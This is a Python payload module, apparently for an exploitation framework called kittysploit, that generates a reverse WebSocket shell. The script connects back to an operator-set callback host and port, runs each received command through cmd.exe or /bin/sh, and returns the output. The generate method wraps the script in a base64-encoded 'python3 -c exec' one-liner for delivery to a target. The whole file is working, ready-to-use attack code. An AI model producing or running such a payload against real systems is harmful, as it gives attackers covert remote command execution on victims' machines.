from kittysploit import *
import base64


class Module(Payload):

	CLIENT_LANGUAGE = "python"

	__info__ = {
		"name": "Python Reverse WebSocket Shell",
		"description": "Connect back over WebSocket and provide an interactive command shell (stdlib only)",
		"category": PayloadCategory.CMD,
		"arch": Arch.PYTHON,
		"platform": Platform.MULTI,
		"listener": "listeners/web/websocket",
		"handler": Handler.REVERSE,
		"session_type": SessionType.WEBSOCKET,
	}

	lhost = OptString("127.0.0.1", "Callback host", True)
	lport = OptPort(8765, "Callback WebSocket port", True)
	path = OptString("/ws", "WebSocket path", False)
	use_ssl = OptBool(False, "Use wss://", False)
	python_binary = OptString("python3", "Python interpreter on target", True)
	shell_binary = OptString("", "Shell override (empty = auto cmd.exe /bin/sh)", False, True)

	def _build_script(self) -> str:
		host = str(self.lhost)
		port = int(self.lport)
		path = str(self.path or "/ws").strip() or "/ws"
		if not path.startswith("/"):
			path = "/" + path
		scheme = "wss" if bool(self.use_ssl) else "ws"
		shell = str(self.shell_binary or "").strip()

		return f"""
import base64,os,socket,ssl,struct,subprocess,hashlib
HOST={host!r};PORT={port};PATH={path!r};SCHEME={scheme!r};SHELL={shell!r}
def _shell():
  if SHELL: return SHELL
  return 'cmd.exe' if os.name=='nt' else '/bin/sh'
def _ws_connect():
  raw=socket.create_connection((HOST,PORT),timeout=20)
  if SCHEME=='wss':
    ctx=ssl.create_default_context(); raw=ctx.wrap_socket(raw,server_hostname=HOST)
  key=base64.b64encode(os.urandom(16)).decode()
  req=(
    'GET '+PATH+' HTTP/1.1\\r\\nHost: '+HOST+':'+str(PORT)+'\\r\\nUpgrade: websocket\\r\\n'
    'Connection: Upgrade\\r\\nSec-WebSocket-Key: '+key+'\\r\\nSec-WebSocket-Version: 13\\r\\n\\r\\n'
  )
  raw.sendall(req.encode())
  data=b''
  while b'\\r\\n\\r\\n' not in data:
    chunk=raw.recv(4096)
    if not chunk: raise OSError('ws handshake closed')
    data+=chunk
  if b'101' not in data.split(b'\\r\\n',1)[0]:
    raise OSError('ws handshake failed: '+data.split(b'\\r\\n',1)[0].decode('latin1','replace'))
  return raw
def _mask(data):
  m=os.urandom(4); return m+bytes(b^m[i%4] for i,b in enumerate(data))
def _send(sock,data):
  if isinstance(data,str): data=data.encode()
  n=len(data); hdr=bytearray([0x81])
  if n<126: hdr.append(0x80|n)
  elif n<65536: hdr.append(0x80|126); hdr+=struct.pack('!H',n)
  else: hdr.append(0x80|127); hdr+=struct.pack('!Q',n)
  sock.sendall(bytes(hdr)+_mask(data))
def _recv(sock):
  def r(n):
    b=b''
    while len(b)<n:
      c=sock.recv(n-len(b))
      if not c: raise OSError('closed')
      b+=c
    return b
  h=r(2); opcode=h[0]&0x0f; ln=h[1]&0x7f; masked=bool(h[1]&0x80)
  if ln==126: ln=struct.unpack('!H',r(2))[0]
  elif ln==127: ln=struct.unpack('!Q',r(8))[0]
  mask=r(4) if masked else b''
  payload=r(ln)
  if masked: payload=bytes(payload[i]^mask[i%4] for i in range(len(payload)))
  if opcode==0x8: raise OSError('ws close')
  if opcode==0x9: _send_pong(sock,payload); return _recv(sock)
  return payload
def _send_pong(sock,data):
  n=len(data); hdr=bytearray([0x8a])
  if n<126: hdr.append(0x80|n)
  else: hdr.append(0x80|126); hdr+=struct.pack('!H',n)
  sock.sendall(bytes(hdr)+_mask(data))
sock=_ws_connect()
sh=_shell()
_send(sock,'KittySploit WebSocket shell ready\\n')
while True:
  try:
    msg=_recv(sock)
  except Exception:
    break
  cmd=msg.decode('utf-8','replace').strip('\\r\\n')
  if not cmd: continue
  if cmd.lower() in ('exit','quit'): break
  try:
    if os.name=='nt':
      p=subprocess.run(['cmd.exe','/c',cmd],capture_output=True)
    else:
      p=subprocess.run([sh,'-c',cmd],capture_output=True)
    out=(p.stdout or b'')+(p.stderr or b'')
    if not out: out=('exit %s\\n'%p.returncode).encode()
  except Exception as e:
    out=('ERROR:%s\\n'%e).encode()
  _send(sock,out)
try: sock.close()
except Exception: pass
""".strip()

	def generate(self):
		script = self._build_script()
		encoded = base64.b64encode(script.encode("utf-8")).decode("ascii")
		py = str(self.python_binary)
		return f'{py} -c "import base64;exec(base64.b64decode(\'{encoded}\').decode())"'
